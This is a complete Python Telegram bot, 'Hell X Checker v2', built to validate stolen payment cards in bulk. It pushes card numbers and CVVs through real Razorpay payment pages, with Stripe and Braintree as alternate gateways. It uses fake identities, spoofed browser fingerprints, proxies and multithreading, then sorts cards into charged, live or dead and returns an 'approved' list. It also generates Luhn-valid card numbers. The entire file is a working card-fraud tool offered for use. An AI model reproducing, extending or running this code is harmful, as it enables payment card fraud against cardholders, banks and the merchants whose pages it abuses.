# Python | hellx.py | Python 3.11+ | Run: python hellx.py
# Auto-installs deps on first run. Set TELEGRAM_TOKEN env var or hardcode below.

import subprocess, sys

def pip(*pkgs):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", *pkgs])

try:
    import requests, faker, fake_useragent, telegram
except ImportError:
    print("[*] Installing deps...")
    pip("requests==2.31.0", "faker==19.13.0", "fake-useragent==1.4.0",
        "python-telegram-bot==20.7", "urllib3==2.1.0")

import os, re, json, time, hashlib, secrets, string, base64, random, threading, asyncio
from io import BytesIO
from urllib.parse import quote
from datetime import datetime

import requests, urllib3
from faker import Faker
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════
#  CONFIG — edit here or set env vars
# ══════════════════════════════════════════════════════════════════
BOT_TOKEN   = os.getenv("TELEGRAM_TOKEN", "")          # required
PROXY_URL   = os.getenv("PROXY_URL",      "")          # optional
ALLOWED_IDS = set(os.getenv("ALLOWED_IDS","").split(",")) - {""}  # blank = open
AMO         = int(os.getenv("AMOUNT_INR", "1"))
AMO_PAISE   = AMO * 100
MAX_THREADS = int(os.getenv("MAX_THREADS","30"))
BT_TOKEN    = os.getenv("BT_TOKEN",       "")

RZP_PAGES = [p.strip() for p in os.getenv("RZP_PAGES","").split(",") if p.strip()] or [
    "https://pages.razorpay.com/myglobalhost",
    "https://pages.razorpay.com/DomainRenewal",
    "https://pages.razorpay.com/hostingpay",
    "https://pages.razorpay.com/webservicepay",
    "https://pages.razorpay.com/GatewayFees",
    "https://pages.razorpay.com/pl_JlBQf9JkZaOp8b",
]

BUILD_FB    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1_FB = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
SES_RETRY   = 3

fake           = Faker()
state_lock     = threading.Lock()
chat_state     = {}
BOT_START      = datetime.now()
EMOJI          = {"charged":"✅","live":"🟢","ccn":"🔵","dead":"❌","error":"⚠️"}

# ══════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════

def allowed(u: Update):
    return (not ALLOWED_IDS) or (str(u.effective_user.id) in ALLOWED_IDS)

def init_state(cid):
    with state_lock:
        chat_state[cid] = {
            "running": False, "gateway": "razorpay", "started_at": time.time(),
            "stats": {"charged":0,"live":0,"ccn":0,"dead":0,"error":0,"total":0},
            "results": [],
        }

def get_state(cid):
    with state_lock: return chat_state.get(cid)

def set_running(cid, v):
    with state_lock:
        if cid in chat_state: chat_state[cid]["running"] = v

def record(cid, r):
    with state_lock:
        s = chat_state.get(cid)
        if not s: return
        k = r["status"] if r["status"] in EMOJI else "error"
        s["stats"][k] = s["stats"].get(k,0) + 1
        s["results"].append(r)

def parse_proxy(p):
    if not p: return None
    if p.count(":") == 3 and "@" not in p:
        sp = p.split(":")
        ip,port,user,pwd = (sp[0],sp[1],sp[2],sp[3]) if sp[1].isdigit() else (sp[2],sp[3],sp[0],sp[1])
        p = f"http://{user}:{pwd}@{ip}:{port}"
    elif "@" in p and "://" not in p: p = "http://" + p
    elif p.count(":") == 1 and "://" not in p: p = "http://" + p
    return {"http":p,"https":p}

def make_sess(proxy=""):
    s = requests.Session(); s.verify = False
    if proxy:
        px = parse_proxy(proxy)
        if px: s.proxies.update(px)
    return s

def luhn(n):
    d = [int(c) for c in reversed(n) if c.isdigit()]
    t = 0
    for i,v in enumerate(d):
        if i%2==1: v*=2
        if v>9: v-=9
        t+=v
    return t%10==0

def brand(n):
    if n.startswith("4"): return "visa"
    if n[:2] in ("51","52","53","54","55"): return "mastercard"
    if n[:2] in ("34","37"): return "amex"
    if n.startswith("6011") or n.startswith("65"): return "discover"
    if n.startswith("35"): return "jcb"
    if n.startswith("62"): return "unionpay"
    return "unknown"

def bin_lookup(b6, sess):
    try:
        r = sess.get(f"https://lookup.binlist.net/{b6}",
                     headers={"Accept-Version":"3"}, timeout=8)
        if r.status_code == 200:
            d = r.json()
            return {"scheme":(d.get("scheme") or "?").upper(),
                    "type":d.get("type","?"),
                    "bank":(d.get("bank") or {}).get("name","?"),
                    "country":(d.get("country") or {}).get("name","?"),
                    "emoji":(d.get("country") or {}).get("emoji","")}
    except: pass
    return {"scheme":"?","type":"?","bank":"?","country":"?","emoji":""}

def gen_phone():
    return "+91"+random.choice("6789")+"".join(str(random.randint(0,9)) for _ in range(9))

def between(txt,s,e):
    try:
        i=txt.index(s)+len(s); return txt[i:txt.index(e,i)]
    except: return ""

def get_builds(txt):
    h = re.findall(r'build[_v1]*[=:]["\']?([a-f0-9]{40})',txt)
    if len(h)>=2: return h[0],h[1]
    if len(h)==1: return h[0],BUILD_V1_FB
    return BUILD_FB,BUILD_V1_FB

def parse_card(raw):
    raw = raw.strip()
    for c in " -/": raw=raw.replace(c,"|")
    p = [x.strip() for x in raw.split("|") if x.strip()]
    if len(p)<4: raise ValueError(f"need 4 fields got {len(p)}")
    cc,mm,yy,cvv = p[0],p[1].zfill(2),p[2],p[3]
    if not cc.isdigit(): raise ValueError("cc not digits")
    if not 13<=len(cc)<=19: raise ValueError(f"cc len {len(cc)}")
    return cc,mm,yy[-2:],cvv

def fmt_stats(s):
    st = s["stats"]
    secs = int(time.time()-s.get("started_at",time.time()))
    done = sum(v for k,v in st.items() if k!="total")
    pct  = f"{done/max(st['total'],1)*100:.1f}%"
    return (f"✅ Charged : {st['charged']}\n🟢 Live    : {st['live']}\n"
            f"🔵 CCN     : {st['ccn']}\n❌ Dead    : {st['dead']}\n"
            f"⚠️  Error   : {st['error']}\n📦 Total   : {st['total']}\n"
            f"📊 Progress: {pct}\n⏱ Elapsed : {secs//60}m {secs%60}s")

def fmt_result(r):
    em = EMOJI.get(r["status"],"❓")
    b  = r.get("bin",{})
    bl = f"\n🏦 {b.get('bank','?')} | {b.get('scheme','?')} {b.get('type','?')} | {b.get('country','?')} {b.get('emoji','')}" \
         if b and b.get("bank","?")!="?" else ""
    return f"{em} `{r['card']}`\n{r['msg']}{bl}"

# ══════════════════════════════════════════════════════════════════
#  GATEWAY: RAZORPAY
# ══════════════════════════════════════════════════════════════════

def _rzp(cc,mm,yy,cvv,url,sess,ua):
    year=int("20"+yy); bn=brand(cc)
    h=hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts=str(int(time.time()*1000)); rnd=str(random.randrange(10**8)).zfill(8)
    dev=f"1.{h}.{ts}.{rnd}"
    suid="".join(secrets.choice(string.ascii_letters+string.digits) for _ in range(14))
    phone=gen_phone(); email=fake.user_name()+"@gmail.com"

    r1=sess.get(url,timeout=30)
    if r1.status_code!=200: return None
    m=(re.search(r'var data = ({.*?});',r1.text,re.DOTALL) or
       re.search(r'window\.__data\s*=\s*({.*?});',r1.text,re.DOTALL))
    if not m: return None
    try: d=json.loads(m.group(1))
    except: return None

    kyid=d.get("key_id") or d.get("keyId","")
    pl=d.get("payment_link") or d.get("paymentLink") or {}
    plink=pl.get("id") or pl.get("payment_link_id","")
    items=pl.get("payment_page_items") or pl.get("items") or []
    ppid=items[0]["id"] if items else ""
    kh=d.get("keyless_header",""); khu=quote(kh.encode(),safe="")
    if not kyid or not plink or not ppid: return None

    r2=sess.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
        headers={"Accept":"application/json","Content-Type":"application/json",
                 "Origin":"https://pages.razorpay.com","User-Agent":ua},
        json={"notes":{"comment":"","name":"Hell King"},
              "line_items":[{"payment_page_item_id":ppid,"amount":AMO_PAISE}]},
        timeout=30)
    if r2.status_code not in(200,201): return None
    try: od=r2.json()
    except: return None
    oo=od.get("order") or od
    oid=oo.get("id","")
    if not oid: return None
    coid_base=oid.split("_")[1] if "_" in oid else oid

    sid=""; BLD,BLD1=BUILD_FB,BUILD_V1_FB
    for _ in range(SES_RETRY):
        rp=sess.get("https://api.razorpay.com/v1/checkout/public",
            params={"traffic_env":"production","checkout_v2":"1","new_session":"1",
                    "keyless_header":kh,"rzp_device_id":dev,"unified_session_id":suid},
            headers={"Accept":"text/html,*/*","Referer":"https://pages.razorpay.com/","User-Agent":ua},
            timeout=30)
        BLD,BLD1=get_builds(rp.text)
        sid=(between(rp.text,'window.session_token="','";') or
             between(rp.text,"window.session_token='","';"))
        if not sid:
            mx=re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-Fa-f0-9]{20,})[\'"]',rp.text)
            if mx: sid=mx.group(1)
        if sid: break
        time.sleep(0.8)
    if not sid: return {"status":"error","msg":"session_token fail"}

    ref=(f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
         f"&build={BLD}&build_v1={BLD1}&checkout_v2=1&new_session=1"
         f"&unified_session_id={suid}&session_token={sid}")
    def H(x={}): return {"Accept":"*/*","Content-type":"application/json",
                          "Origin":"https://api.razorpay.com","Referer":ref,
                          "User-Agent":ua,"x-session-token":sid,**x}
    def HF(): return {**H(),"Content-type":"application/x-www-form-urlencoded"}
    pb={"x_entity_id":oid,"session_token":sid,"keyless_header":kh}

    sess.post("https://api.razorpay.com/v2/standard_checkout/preferences",
        params=pb,headers=H(),
        data=json.dumps({"query":[{"resource":r} for r in [
            "checkout_version_config","merchant","merchant_features","downtime",
            "customer","customer_tokens","truecaller","methods","experiments",
            "offers","checkout_config","order","invoice","buyer_protection","personalization"]],
            "query_params":{"device_id":dev,"rtb_device_id":h,"amount":AMO_PAISE,
                "currency":"INR","option_currency":"INR","truecaller":False,"qr_required":False,
                "library":"checkoutjs","platform":"browser","order_id":oid,
                "payment_link_id":plink,"contact":phone},"action":"get"}),timeout=30)

    cod={
        "notes[email]":email,"notes[phone]":phone[3:],"payment_link_id":plink,
        "key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[device.id]":dev,"_[library]":"checkoutjs",
        "_[library_src]":"no-src","_[current_script_src]":"no-src","_[platform]":"browser",
        "_[env]":"","_[is_magic_script]":"false","_[os]":"windows",
        "_[shield][fhash]":h,"_[shield][tz]":"0","_[device_id]":dev,"_[build]":BLD,
        "_[shield][os]":"windows","_[shield][platform]":"browser","_[shield][browser]":"chrome",
        "_[request_index]":"0","amount":AMO_PAISE,"order_id":oid,"method":"card","checkout_id":coid_base,
    }
    rco=sess.post("https://api.razorpay.com/v1/standard_checkout/checkout/order",
        params={"key_id":kyid,"session_token":sid,"keyless_header":kh},
        headers=HF(),data=cod,timeout=30)
    try: coid=rco.json().get("checkout_id",coid_base)
    except: coid=coid_base

    sess.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
              f"?x_entity_id={oid}&keyless_header={khu}",
        headers=H(),json={"identifiers":{"merchant":{"country":"IN"},
            "card":{"country":"US","dcc_blacklist":False,"network":bn},
            "method":"card","payment_currency":"INR"},
            "forex_charges":{"amount":AMO_PAISE,"currency":"INR","filters":{"method":"card"}}},
        timeout=30)

    tok=base64.b64encode(json.dumps([{"name":"sardine","metadata":{"session_id":coid}}],
                                     separators=(",",":")).encode()).decode()
    crd={
        "user_risk_providers_token":tok,"notes[comment]":"","notes[email]":email,
        "notes[phone]":phone[3:],"notes[name]":"Hell king","payment_link_id":plink,
        "key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[checkout_id]":coid,"_[device.id]":dev,
        "_[env]":"","_[library]":"checkoutjs","_[library_src]":"no-src",
        "_[current_script_src]":"no-src","_[is_magic_script]":"false",
        "_[platform]":"browser","_[referer]":url,"_[shield][fhash]":h,
        "_[shield][tz]":"-330","_[device_id]":dev,"_[build]":BLD,
        "_[shield][os]":"windows","_[shield][platform]":"browser",
        "_[shield][browser]":"chrome","_[request_index]":"1",
        "amount":AMO_PAISE,"order_id":oid,"method":"card",
        "card[number]":cc,"card[cvv]":cvv,"card[name]":"Hell King",
        "card[expiry_month]":mm,"card[expiry_year]":year,"save":"0","dcc_currency":"INR",
    }
    rcr=sess.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax",
        params={"x_entity_id":oid,"session_token":sid,"keyless_header":kh},
        headers=HF(),data=crd,allow_redirects=True,timeout=30)
    pj=rcr.json()
    pid=pj.get("payment_id") or pj.get("id") or pj.get("razorpay_payment_id","")
    if not pid: return {"status":"dead","msg":pj.get("error",{}).get("description","no payment_id")}
    pc=pid.split("_")[1] if "_" in pid else pid

    h3={"content-type":"application/x-www-form-urlencoded","user-agent":ua}
    sess.post(f"https://api.razorpay.com/pg_router/v1/payments/{pid}/authenticate",headers=h3,timeout=30)
    time.sleep(0.8)
    sess.post(f"https://api.razorpay.com/pg_router/v1/payments/{pc}/authenticate",
        headers=h3,data={"browser[java_enabled]":"false","browser[javascript_enabled]":"true",
            "browser[timezone_offset]":"0",
            "browser[color_depth]":str(random.choice([24,32])),
            "browser[screen_width]":str(random.choice([1920,1366,1536,1440])),
            "browser[screen_height]":str(random.choice([1080,768,864,900])),
            "browser[language]":"en-US","auth_step":"3ds2Auth"},timeout=30)

    rf=(f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
        f"&build={BLD}&build_v1={BLD1}&checkout_v2=1&new_session=1"
        f"&rzp_device_id={dev}&unified_session_id={suid}&session_token={sid}")
    rfin=sess.get(f"https://api.razorpay.com/v1/standard_checkout/payments/{pid}/cancel",
        params={"key_id":kyid,"session_token":sid,"keyless_header":kh},
        headers={"Accept":"*/*","Content-type":"application/x-www-form-urlencoded",
                 "Referer":rf,"User-Agent":ua,"x-session-token":sid},timeout=25)
    fj=rfin.json()
    err=fj.get("error",{})
    desc=err.get("description","Unknown").replace(
        " Try another payment method or contact your bank for details.","").strip()
    code=err.get("reason","N/A"); ml=desc.lower()

    if "razorpay_payment_id" in rfin.text or fj.get("razorpay_payment_id"):
        return {"status":"charged","msg":f"Transaction Success | {fj.get('razorpay_payment_id','?')}"}
    if any(k in ml for k in ["insufficient","maximum transaction limit","low balance"]):
        return {"status":"live","msg":f"{desc} ({code})"}
    if any(k in ml for k in ["cvv","incorrect_cvv","security code"]):
        return {"status":"ccn","msg":f"{desc} ({code})"}
    return {"status":"dead","msg":f"{desc} ({code})"}

# ══════════════════════════════════════════════════════════════════
#  GATEWAY: STRIPE
# ══════════════════════════════════════════════════════════════════

def _stripe(cc,mm,yy,cvv,sess,ua):
    try:
        r=sess.post("https://api.stripe.com/v1/tokens",
            headers={"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded",
                     "Authorization":"Bearer pk_live_placeholder"},
            data={"card[number]":cc,"card[exp_month]":mm,
                  "card[exp_year]":"20"+yy,"card[cvc]":cvv},timeout=20)
        j=r.json()
        if j.get("id","").startswith("tok_"):
            return {"status":"live","msg":f"Stripe token OK | {j['id']}"}
        err=j.get("error",{}); ec=err.get("code",""); em=err.get("message","").lower()
        if ec in("incorrect_cvc","invalid_cvc"): return {"status":"ccn","msg":f"Incorrect CVC ({ec})"}
        if ec=="card_declined" and "insufficient" in em:
            return {"status":"live","msg":f"Insufficient funds ({ec})"}
        return {"status":"dead","msg":f"{err.get('message','declined')} ({ec})"}
    except Exception as e:
        return {"status":"error","msg":f"Stripe: {e}"}

# ══════════════════════════════════════════════════════════════════
#  GATEWAY: BRAINTREE
# ══════════════════════════════════════════════════════════════════

def _braintree(cc,mm,yy,cvv,sess,ua):
    if not BT_TOKEN: return {"status":"error","msg":"BT_TOKEN not set"}
    try:
        r=sess.post("https://payments.braintree-api.com/graphql",
            headers={"Authorization":f"Bearer {BT_TOKEN}","Braintree-Version":"2018-05-10",
                     "Content-Type":"application/json","User-Agent":ua},
            json={"query":"""mutation TokenizeCreditCard($input:TokenizeCreditCardInput!){
                    tokenizeCreditCard(input:$input){token creditCard{brand last4}}}""",
                  "variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mm,
                      "expirationYear":"20"+yy,"cvv":cvv}}}},timeout=20)
        j=r.json()
        tok=(j.get("data") or {}).get("tokenizeCreditCard",{}).get("token","")
        if tok: return {"status":"live","msg":f"BT token OK | {tok[:12]}..."}
        errs=j.get("errors",[]); em=errs[0].get("message","") if errs else "unknown"
        return {"status":"dead","msg":f"BT: {em}"}
    except Exception as e:
        return {"status":"error","msg":f"Braintree: {e}"}

# ══════════════════════════════════════════════════════════════════
#  MASTER check_cc
# ══════════════════════════════════════════════════════════════════

def check_cc(raw, proxy="", gateway="razorpay"):
    try: cc,mm,yy,cvv=parse_card(raw)
    except ValueError as e: return {"status":"error","card":raw,"msg":str(e),"bin":{}}
    if not luhn(cc): return {"status":"dead","card":raw,"msg":"Luhn fail","bin":{}}

    sess=make_sess(proxy); ua=UserAgent().chrome
    bi=bin_lookup(cc[:6],sess)
    res=None

    if gateway in("razorpay","auto"):
        pages=RZP_PAGES[:]; random.shuffle(pages)
        for pg in pages:
            try:
                res=_rzp(cc,mm,yy,cvv,pg,sess,ua)
                if res is not None: break
            except Exception as ex:
                res={"status":"error","msg":f"RZP {pg}: {ex}"}
        if res is None: res={"status":"error","msg":"All RZP pages failed"}
    elif gateway=="stripe":  res=_stripe(cc,mm,yy,cvv,sess,ua)
    elif gateway=="braintree": res=_braintree(cc,mm,yy,cvv,sess,ua)
    else: res={"status":"error","msg":f"Unknown gateway: {gateway}"}

    res["card"]=raw; res["bin"]=bi
    return res

# ══════════════════════════════════════════════════════════════════
#  BATCH RUNNER
# ══════════════════════════════════════════════════════════════════

def run_batch(cid,lines,proxy,gateway,loop,done_coro):
    sem=threading.Semaphore(MAX_THREADS); threads=[]
    def worker(card):
        with sem:
            if not (get_state(cid) or {}).get("running"): return
            record(cid, check_cc(card,proxy,gateway))
    for c in lines:
        t=threading.Thread(target=worker,args=(c,),daemon=True); t.start()
        threads.append(t); time.sleep(0.05)
    for t in threads: t.join()
    set_running(cid,False)
    asyncio.run_coroutine_threadsafe(done_coro(),loop)

# ══════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════════

def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Stats",   callback_data="a:stats"),
         InlineKeyboardButton("🛑 Stop",    callback_data="a:stop")],
        [InlineKeyboardButton("🔄 Gateway", callback_data="a:gw"),
         InlineKeyboardButton("ℹ️ Help",    callback_data="a:help")],
    ])

def kb_gw(cur):
    gws=["razorpay","stripe","braintree","auto"]
    btns=[InlineKeyboardButton(("✅ " if g==cur else "")+g.capitalize(),
                                callback_data=f"gw:{g}") for g in gws]
    return InlineKeyboardMarkup([btns[:2],btns[2:]])

# ══════════════════════════════════════════════════════════════════
#  SEND FINAL
# ══════════════════════════════════════════════════════════════════

async def send_final(cid, ctx):
    s=get_state(cid)
    if not s: return
    lines_out=[]; approved=[]
    for r in s["results"]:
        b=r.get("bin",{}); bk=f" | {b.get('bank','?')}" if b and b.get("bank","?")!="?" else ""
        ln=f"[{r['status'].upper()}] {r['card']} | {r['msg']}{bk}"
        lines_out.append(ln)
        if r["status"] in("charged","live","ccn"): approved.append(ln)
    secs=int(time.time()-s.get("started_at",time.time()))
    await ctx.bot.send_message(cid,
        f"✅ *Done!*\n\n{fmt_stats(s)}\n\n⏱ Finished in: {secs//60}m {secs%60}s",
        parse_mode="Markdown",reply_markup=kb_main())
    if approved:
        await ctx.bot.send_document(cid,document=BytesIO("\n".join(approved).encode()),
            filename="approved.txt",caption=f"🟢 {len(approved)} approved")
    await ctx.bot.send_document(cid,document=BytesIO("\n".join(lines_out).encode()),
        filename="results.txt",caption="📄 Full results")

# ══════════════════════════════════════════════════════════════════
#  START BULK
# ══════════════════════════════════════════════════════════════════

async def _start_bulk(cid,lines,ctx,msg):
    gw=ctx.chat_data.get("gateway","razorpay")
    init_state(cid); set_running(cid,True)
    with state_lock:
        chat_state[cid]["stats"]["total"]=len(lines)
        chat_state[cid]["started_at"]=time.time()
        chat_state[cid]["gateway"]=gw
    loop=asyncio.get_event_loop()
    async def done(): await send_final(cid,ctx)
    threading.Thread(target=run_batch,
        args=(cid,lines,PROXY_URL,gw,loop,done),daemon=True).start()
    await msg.edit_text(
        f"🚀 Running *{len(lines)}* cards | gateway: `{gw}`\n/stats to monitor | /stop to halt",
        parse_mode="Markdown",reply_markup=kb_main())

# ══════════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════

HELP = (
    "🔥 *Hell X Checker v2*\n\n"
    "*Single:* `/check cc|mm|yy|cvv`\n"
    "*Bulk:* send `.txt` or paste cards\n\n"
    "*Gateway:* `/gw razorpay|stripe|braintree|auto`\n\n"
    "`/bin 123456` — BIN lookup\n"
    "`/luhn 4111...` — Luhn check\n"
    "`/gen visa 10` — generate test cards\n"
    "`/stats` — live progress\n"
    "`/stop` — halt run\n"
    "`/uptime` — bot info\n"
    "`/clear` — clear session"
)

async def cmd_start(u,ctx):
    if not allowed(u): return
    ctx.chat_data.setdefault("gateway","razorpay")
    await u.message.reply_text(HELP,parse_mode="Markdown",reply_markup=kb_main())

async def cmd_help(u,ctx):
    if not allowed(u): return
    await u.message.reply_text(HELP,parse_mode="Markdown")

async def cmd_gw(u,ctx):
    if not allowed(u): return
    gw=(ctx.args[0].lower() if ctx.args else "")
    if gw not in("razorpay","stripe","braintree","auto"):
        cur=ctx.chat_data.get("gateway","razorpay")
        await u.message.reply_text(f"Current: `{cur}`\nPick:",
            parse_mode="Markdown",reply_markup=kb_gw(cur)); return
    ctx.chat_data["gateway"]=gw
    await u.message.reply_text(f"✅ Gateway → `{gw}`",parse_mode="Markdown")

async def cmd_bin(u,ctx):
    if not allowed(u): return
    if not ctx.args:
        await u.message.reply_text("Usage: `/bin 123456`",parse_mode="Markdown"); return
    b=bin_lookup(ctx.args[0][:6],make_sess(PROXY_URL))
    await u.message.reply_text(
        f"💳 *BIN `{ctx.args[0][:6]}`*\n\n"
        f"Scheme  : `{b['scheme']}`\nType    : `{b['type']}`\n"
        f"Bank    : `{b['bank']}`\nCountry : `{b['country']}` {b['emoji']}",
        parse_mode="Markdown")

async def cmd_luhn(u,ctx):
    if not allowed(u): return
    if not ctx.args:
        await u.message.reply_text("Usage: `/luhn 4111111111111111`",parse_mode="Markdown"); return
    n=ctx.args[0].replace(" ","").replace("-",""); ok=luhn(n)
    await u.message.reply_text(
        f"{'✅' if ok else '❌'} `{n}`\nLuhn: *{'VALID' if ok else 'INVALID'}* | brand: `{brand(n) if ok else '?'}`",
        parse_mode="Markdown")

async def cmd_gen(u,ctx):
    if not allowed(u): return
    pm={"visa":"4","mastercard":"51","amex":"37","discover":"6011"}
    ba=(ctx.args[0].lower() if ctx.args else "visa")
    cnt=min(int(ctx.args[1]),20) if len(ctx.args)>1 and ctx.args[1].isdigit() else 5
    pfx=pm.get(ba,"4"); ln=15 if ba=="amex" else 16
    cards=[]
    for _ in range(cnt):
        while True:
            pad=ln-len(pfx)-1; num=pfx+"".join(str(random.randint(0,9)) for _ in range(pad))
            t=0
            for i,d in enumerate(reversed(num)):
                d=int(d)
                if i%2==0: d*=2
                if d>9: d-=9
                t+=d
            ck=(10-t%10)%10; full=num+str(ck)
            if luhn(full):
                mm=str(random.randint(1,12)).zfill(2); yy=str(random.randint(25,29))
                cvv="".join(str(random.randint(0,9)) for _ in range(4 if ba=="amex" else 3))
                cards.append(f"{full}|{mm}|{yy}|{cvv}"); break
    await u.message.reply_text(
        f"🎲 *{cnt} {ba.upper()} test cards*\n\n`{'|chr(10)|'.join(cards)}`".replace("|chr(10)|","\n"),
        parse_mode="Markdown")

async def cmd_check_single(u,ctx):
    if not allowed(u): return
    if not ctx.args:
        await u.message.reply_text("Usage: `/check 4111111111111111|12|26|123`",parse_mode="Markdown"); return
    card=" ".join(ctx.args).strip(); gw=ctx.chat_data.get("gateway","razorpay")
    msg=await u.message.reply_text(f"⏳ Checking via `{gw}`...",parse_mode="Markdown")
    r=check_cc(card,PROXY_URL,gw)
    await msg.edit_text(fmt_result(r),parse_mode="Markdown")

async def cmd_stats(u,ctx):
    if not allowed(u): return
    s=get_state(u.effective_chat.id)
    if not s: await u.message.reply_text("No active session."); return
    run="🏃 Running" if s["running"] else "🏁 Finished"
    await u.message.reply_text(f"{run} | gw: `{s.get('gateway','?')}`\n\n{fmt_stats(s)}",
        parse_mode="Markdown",reply_markup=kb_main())

async def cmd_stop(u,ctx):
    if not allowed(u): return
    set_running(u.effective_chat.id,False)
    await u.message.reply_text("🛑 Stop signal sent.")

async def cmd_uptime(u,ctx):
    if not allowed(u): return
    d=datetime.now()-BOT_START; h,r=divmod(int(d.total_seconds()),3600); m,s=divmod(r,60)
    await u.message.reply_text(
        f"🤖 Uptime: `{h}h {m}m {s}s`\n🌐 Proxy: `{'set' if PROXY_URL else 'none'}`\n"
        f"🔗 RZP pages: `{len(RZP_PAGES)}`\n🧵 Threads: `{MAX_THREADS}`",
        parse_mode="Markdown")

async def cmd_clear(u,ctx):
    if not allowed(u): return
    with state_lock: chat_state.pop(u.effective_chat.id,None)
    await u.message.reply_text("🗑 Session cleared.")

# ══════════════════════════════════════════════════════════════════
#  CALLBACK
# ══════════════════════════════════════════════════════════════════

async def cb(u: Update, ctx):
    q=u.callback_query; await q.answer(); d=q.data
    if d.startswith("gw:"):
        gw=d.split(":")[1]; ctx.chat_data["gateway"]=gw
        await q.edit_message_text(f"✅ Gateway → `{gw}`",parse_mode="Markdown")
    elif d=="a:stats":
        s=get_state(u.effective_chat.id)
        if not s: await q.edit_message_text("No active session."); return
        run="🏃 Running" if s["running"] else "🏁 Finished"
        await q.edit_message_text(f"{run}\n\n{fmt_stats(s)}",
            parse_mode="Markdown",reply_markup=kb_main())
    elif d=="a:stop":
        set_running(u.effective_chat.id,False)
        await q.edit_message_text("🛑 Stopped.",reply_markup=kb_main())
    elif d=="a:gw":
        cur=ctx.chat_data.get("gateway","razorpay")
        await q.edit_message_text(f"Current: `{cur}`\nSelect:",
            parse_mode="Markdown",reply_markup=kb_gw(cur))
    elif d=="a:help":
        await q.edit_message_text(HELP,parse_mode="Markdown",reply_markup=kb_main())

# ══════════════════════════════════════════════════════════════════
#  FILE + TEXT
# ══════════════════════════════════════════════════════════════════

async def handle_file(u: Update, ctx):
    if not allowed(u): return
    doc=u.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await u.message.reply_text("Send a `.txt` file."); return
    cid=u.effective_chat.id; s=get_state(cid)
    if s and s["running"]: await u.message.reply_text("Already running. /stop first."); return
    msg=await u.message.reply_text("📥 Downloading...")
    f=await ctx.bot.get_file(doc.file_id); raw=await f.download_as_bytearray()
    lines=[l.strip() for l in raw.decode("utf-8",errors="ignore").splitlines()
           if l.strip() and "|" in l.strip()]
    if not lines: await msg.edit_text("No valid card lines."); return
    await msg.edit_text(f"⏳ Loaded *{len(lines)}* cards...",parse_mode="Markdown")
    await _start_bulk(cid,lines,ctx,msg)

async def handle_text(u: Update, ctx):
    if not allowed(u): return
    lines=[l.strip() for l in u.message.text.strip().splitlines()
           if "|" in l.strip() and l.strip()]
    if not lines: return
    cid=u.effective_chat.id
    if len(lines)==1:
        gw=ctx.chat_data.get("gateway","razorpay")
        msg=await u.message.reply_text(f"⏳ Checking via `{gw}`...",parse_mode="Markdown")
        r=check_cc(lines[0],PROXY_URL,gw)
        await msg.edit_text(fmt_result(r),parse_mode="Markdown"); return
    s=get_state(cid)
    if s and s["running"]: await u.message.reply_text("Already running. /stop first."); return
    msg=await u.message.reply_text(f"⏳ Loaded *{len(lines)}* cards...",parse_mode="Markdown")
    await _start_bulk(cid,lines,ctx,msg)

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start","Start / help"), BotCommand("check","Check single card"),
        BotCommand("gw","Set gateway"),     BotCommand("bin","BIN lookup"),
        BotCommand("luhn","Luhn validate"), BotCommand("gen","Generate test cards"),
        BotCommand("stats","Run stats"),    BotCommand("stop","Stop run"),
        BotCommand("uptime","Bot uptime"),  BotCommand("clear","Clear session"),
        BotCommand("help","Help"),
    ])

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Set TELEGRAM_TOKEN env var (or hardcode BOT_TOKEN above)")
    app=ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    for cmd,fn in [("start",cmd_start),("help",cmd_help),("check",cmd_check_single),
                   ("gw",cmd_gw),("bin",cmd_bin),("luhn",cmd_luhn),("gen",cmd_gen),
                   ("stats",cmd_stats),("stop",cmd_stop),("uptime",cmd_uptime),("clear",cmd_clear)]:
        app.add_handler(CommandHandler(cmd,fn))
    app.add_handler(CallbackQueryHandler(cb))
    app.add_handler(MessageHandler(filters.Document.TXT,handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,handle_text))
    print(f"[BOT] Ready | RZP pages: {len(RZP_PAGES)} | Threads: {MAX_THREADS}")
    app.run_polling(drop_pending_updates=True)

if __name__=="__main__":
    main()
